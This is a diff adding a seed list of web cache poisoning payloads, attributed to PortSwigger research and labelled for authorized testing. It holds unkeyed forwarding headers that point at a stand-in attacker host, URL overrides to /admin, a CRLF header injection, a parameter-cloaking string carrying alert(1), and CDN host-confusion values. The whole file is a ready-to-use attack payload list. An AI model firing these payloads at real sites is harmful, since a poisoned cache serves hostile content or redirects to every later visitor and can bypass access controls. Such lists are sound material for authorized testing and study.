@@ -1,0 +1,48 @@
+# Web Cache Poisoning — unkeyed header seeds
+# Source: PortSwigger web-cache-poisoning + Param Miner research
+# Tier: Curated | Authorized testing only
+# Always use cache busters (unique query params) during testing
+
+# --- Host / forwarding headers (common unkeyed) ---
+X-Forwarded-Host: evil.attacker.com
+X-Host: evil.attacker.com
+X-Forwarded-Server: evil.attacker.com
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Forwarded-Scheme: http
+X-Forwarded-Proto: http
+X-Forwarded-Port: 1337
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Original-Host: evil.attacker.com
+X-Forwarded-Prefix: /evil
+X-Forwarded-Path: /evil
+X-Forwarded-Uri: /evil
+X-Url-Scheme: http
+X-HTTP-Method-Override: GET
+X-HTTP-Method: GET
+X-Method-Override: GET
+
+# --- Fat GET / method override combos ---
+GET /?cb={CACHE_BUSTER} HTTP/1.1
+X-HTTP-Method-Override: POST
+
+# --- Cache key injection delimiters (implementation-dependent) ---
+X-Forwarded-Host: target.com?cb={CACHE_BUSTER}&x=
+X-Forwarded-Host: target.com%0d%0aX-Cache-Key: poison
+
+# --- Portswigger-style reflected host in link/script ---
+# Inject via unkeyed header; confirm poisoned response served to other users
+
+# --- Fat GET parameter cloaking seeds ---
+/?cb={CACHE_BUSTER}&utm_content=1;callback=alert(1)
+/?cb={CACHE_BUSTER}&__cf_chl_tk=1&x=1
+
+# --- Vary header abuse probes ---
+Accept: text/html,application/xhtml+xml
+Accept-Language: en, evil
+Accept-Encoding: gzip, deflate, br, evil
+
+# --- CDN-specific (test only on in-scope targets) ---
+X-Original-URL: /@evil.attacker.com
+X-Forwarded-Host: evil.attacker.com:443@target.com
